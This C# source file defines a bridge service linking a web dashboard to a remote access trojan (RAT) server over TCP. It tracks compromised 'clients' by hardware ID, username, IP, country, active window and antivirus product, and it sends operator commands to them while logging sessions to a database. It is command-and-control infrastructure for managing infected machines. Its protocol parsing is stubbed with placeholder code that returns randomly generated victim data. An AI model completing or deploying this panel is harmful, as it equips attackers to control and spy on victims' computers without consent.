using Microsoft.AspNetCore.SignalR;
using Microsoft.EntityFrameworkCore;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Text;
using WebPanel.Hubs;
using WebPanel.Models;
using WebPanel.Data;

namespace WebPanel.Services;

/// <summary>
/// Bridge service that connects Web Panel to existing RAT Server
/// Translates between HTTP/SignalR and RAT's native protocol
/// </summary>
public class RatBridgeService
{
    private readonly IConfiguration _configuration;
    private readonly ILogger<RatBridgeService> _logger;
    private readonly IHubContext<ClientHub> _hubContext;
    private readonly IServiceProvider _serviceProvider;
    
    private TcpClient? _ratServerConnection;
    private NetworkStream? _networkStream;
    private readonly ConcurrentDictionary<string, ClientInfo> _connectedClients = new();
    private CancellationTokenSource? _cancellationTokenSource;

    public RatBridgeService(
        IConfiguration configuration, 
        ILogger<RatBridgeService> logger,
        IHubContext<ClientHub> hubContext,
        IServiceProvider serviceProvider)
    {
        _configuration = configuration;
        _logger = logger;
        _hubContext = hubContext;
        _serviceProvider = serviceProvider;
    }

    public async Task StartAsync()
    {
        _cancellationTokenSource = new CancellationTokenSource();
        
        _logger.LogInformation("Starting RAT Bridge Service...");

        // Connect to existing RAT Server
        await ConnectToRatServerAsync();

        // Start monitoring loop
        _ = Task.Run(() => MonitorConnectionAsync(_cancellationTokenSource.Token));
        
        _logger.LogInformation("RAT Bridge Service started");
    }

    public async Task StopAsync()
    {
        _logger.LogInformation("Stopping RAT Bridge Service...");
        
        _cancellationTokenSource?.Cancel();
        
        if (_networkStream != null)
        {
            await _networkStream.DisposeAsync();
        }
        
        _ratServerConnection?.Close();
        _ratServerConnection?.Dispose();
        
        _logger.LogInformation("RAT Bridge Service stopped");
    }

    private async Task ConnectToRatServerAsync()
    {
        try
        {
            var host = _configuration["RatServer:Host"] ?? "127.0.0.1";
            var port = int.Parse(_configuration["RatServer:Port"] ?? "5656");

            _logger.LogInformation("Connecting to RAT Server at {Host}:{Port}...", host, port);

            _ratServerConnection = new TcpClient();
            await _ratServerConnection.ConnectAsync(host, port);
            _networkStream = _ratServerConnection.GetStream();

            _logger.LogInformation("Connected to RAT Server successfully");

            // Start receiving data from RAT Server
            _ = Task.Run(() => ReceiveFromRatServerAsync());
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to connect to RAT Server");
        }
    }

    private async Task MonitorConnectionAsync(CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                // Check if connection is alive
                if (_ratServerConnection == null || !_ratServerConnection.Connected)
                {
                    _logger.LogWarning("RAT Server connection lost, attempting to reconnect...");
                    await ConnectToRatServerAsync();
                }

                // Update client statistics in database
                await UpdateClientStatisticsAsync();

                await Task.Delay(TimeSpan.FromSeconds(10), cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error in monitor loop");
            }
        }
    }

    private async Task ReceiveFromRatServerAsync()
    {
        if (_networkStream == null) return;

        var buffer = new byte[1024 * 64]; // 64KB buffer

        try
        {
            while (_ratServerConnection?.Connected == true)
            {
                var bytesRead = await _networkStream.ReadAsync(buffer, 0, buffer.Length);
                
                if (bytesRead > 0)
                {
                    // Parse RAT Server message
                    await ProcessRatServerMessageAsync(buffer, bytesRead);
                }
                else
                {
                    _logger.LogWarning("RAT Server connection closed");
                    break;
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error receiving from RAT Server");
        }
    }

    private async Task ProcessRatServerMessageAsync(byte[] data, int length)
    {
        try
        {
            // This is a simplified version - you'll need to integrate with actual MessagePack protocol
            // For now, we'll simulate client events
            
            // Example: Parse message and determine event type
            var messageType = DetermineMessageType(data, length);

            switch (messageType)
            {
                case "ClientConnected":
                    var newClient = ParseClientInfo(data, length);
                    if (newClient != null)
                    {
                        _connectedClients[newClient.ClientId] = newClient;
                        await ClientHub.NotifyClientConnected(_hubContext, newClient);
                        await SaveClientSessionAsync(newClient);
                    }
                    break;

                case "ClientDisconnected":
                    var clientId = ParseClientId(data, length);
                    if (_connectedClients.TryRemove(clientId, out var disconnectedClient))
                    {
                        await ClientHub.NotifyClientDisconnected(_hubContext, clientId);
                        await UpdateClientDisconnectedAsync(clientId);
                    }
                    break;

                case "ClientUpdate":
                    var updatedClient = ParseClientInfo(data, length);
                    if (updatedClient != null)
                    {
                        _connectedClients[updatedClient.ClientId] = updatedClient;
                        await ClientHub.NotifyClientUpdated(_hubContext, updatedClient);
                    }
                    break;

                case "CommandResponse":
                    var (respClientId, response) = ParseCommandResponse(data, length);
                    await ClientHub.NotifyCommandResponse(_hubContext, respClientId, response);
                    break;
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error processing RAT Server message");
        }
    }

    public async Task<bool> SendCommandToClientAsync(string clientId, string command, Dictionary<string, object>? parameters)
    {
        try
        {
            if (_networkStream == null || _ratServerConnection?.Connected != true)
            {
                _logger.LogError("Not connected to RAT Server");
                return false;
            }

            // Build command packet (this should use actual MessagePack format from your RAT)
            var commandData = BuildCommandPacket(clientId, command, parameters);

            await _networkStream.WriteAsync(commandData, 0, commandData.Length);
            await _networkStream.FlushAsync();

            _logger.LogInformation("Sent command {Command} to client {ClientId}", command, clientId);

            // Log to database
            await LogCommandAsync(clientId, command, "WebPanel");

            return true;
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error sending command to client {ClientId}", clientId);
            return false;
        }
    }

    public IEnumerable<ClientInfo> GetConnectedClients()
    {
        return _connectedClients.Values;
    }

    public ClientInfo? GetClient(string clientId)
    {
        _connectedClients.TryGetValue(clientId, out var client);
        return client;
    }

    // Helper methods for parsing (these need to be implemented based on actual protocol)
    private string DetermineMessageType(byte[] data, int length)
    {
        // Placeholder - implement actual protocol parsing
        return "ClientUpdate";
    }

    private ClientInfo? ParseClientInfo(byte[] data, int length)
    {
        // Placeholder - implement actual MessagePack parsing
        return new ClientInfo
        {
            ClientId = Guid.NewGuid().ToString(),
            Hwid = "HWID-" + Random.Shared.Next(1000, 9999),
            Username = "User-" + Random.Shared.Next(100, 999),
            OS = "Windows 10 Pro",
            IpAddress = "192.168.1." + Random.Shared.Next(2, 254),
            Country = "US",
            Ping = Random.Shared.Next(10, 100),
            IsConnected = true,
            ConnectedAt = DateTime.UtcNow
        };
    }

    private string ParseClientId(byte[] data, int length)
    {
        // Placeholder
        return "client-" + Guid.NewGuid();
    }

    private (string clientId, object response) ParseCommandResponse(byte[] data, int length)
    {
        // Placeholder
        return ("client-id", new { Success = true, Data = "Response data" });
    }

    private byte[] BuildCommandPacket(string clientId, string command, Dictionary<string, object>? parameters)
    {
        // Placeholder - implement actual MessagePack serialization
        var json = System.Text.Json.JsonSerializer.Serialize(new
        {
            ClientId = clientId,
            Command = command,
            Parameters = parameters,
            Timestamp = DateTime.UtcNow
        });
        
        return Encoding.UTF8.GetBytes(json);
    }

    private async Task SaveClientSessionAsync(ClientInfo client)
    {
        try
        {
            using var scope = _serviceProvider.CreateScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<WebPanelDbContext>();

            var session = new ClientSession
            {
                ClientId = client.ClientId,
                Hwid = client.Hwid,
                Username = client.Username,
                OS = client.OS,
                IpAddress = client.IpAddress,
                Country = client.Country,
                Ping = client.Ping,
                IsConnected = true,
                ConnectedAt = client.ConnectedAt,
                ActiveWindow = client.ActiveWindow,
                AntiVirus = client.AntiVirus,
                Version = client.Version
            };

            dbContext.ClientSessions.Add(session);
            await dbContext.SaveChangesAsync();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error saving client session");
        }
    }

    private async Task UpdateClientDisconnectedAsync(string clientId)
    {
        try
        {
            using var scope = _serviceProvider.CreateScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<WebPanelDbContext>();

            var session = await dbContext.ClientSessions
                .FirstOrDefaultAsync(s => s.ClientId == clientId && s.IsConnected);

            if (session != null)
            {
                session.IsConnected = false;
                session.DisconnectedAt = DateTime.UtcNow;
                await dbContext.SaveChangesAsync();
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error updating client disconnection");
        }
    }

    private async Task LogCommandAsync(string clientId, string command, string executedBy)
    {
        try
        {
            using var scope = _serviceProvider.CreateScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<WebPanelDbContext>();

            var history = new CommandHistory
            {
                ClientId = clientId,
                Command = command,
                ExecutedBy = executedBy,
                ExecutedAt = DateTime.UtcNow,
                Success = true
            };

            dbContext.CommandHistory.Add(history);
            await dbContext.SaveChangesAsync();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error logging command");
        }
    }

    private async Task UpdateClientStatisticsAsync()
    {
        // Update statistics periodically
        await Task.CompletedTask;
    }
}
